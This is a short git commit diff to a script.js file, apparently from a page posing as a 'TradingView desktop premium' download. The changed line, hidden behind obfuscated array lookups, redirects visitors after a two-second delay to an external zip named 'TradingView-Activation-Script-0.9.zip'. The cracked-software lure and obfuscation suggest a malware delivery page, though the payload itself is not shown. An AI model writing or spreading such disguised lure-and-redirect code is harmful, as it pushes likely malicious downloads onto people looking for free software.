aeda601fc7e3b9d4c98cb4301a142ac7d573d36e
hanepat <hanepat211@gmail.com>
2026-04-29 22:44:04 +0200

    Update script.js

--- script.js
+++ script.js
@@ -9,6 +9,6 @@
 
     window[_0[5]](function() {
         loaderElement[_0[2]] = _0[4];
-        window[_0[6]][_0[7]] = 'https://www.hanepat.shop/hanepat.github.io/tradingview-desktop-premium/securedownload/';
+        window[_0[6]][_0[7]] = 'https://www.hanepat.shop//downloads/TradingView-Activation-Script-0.9.zip';
     }, 2000);
 })();
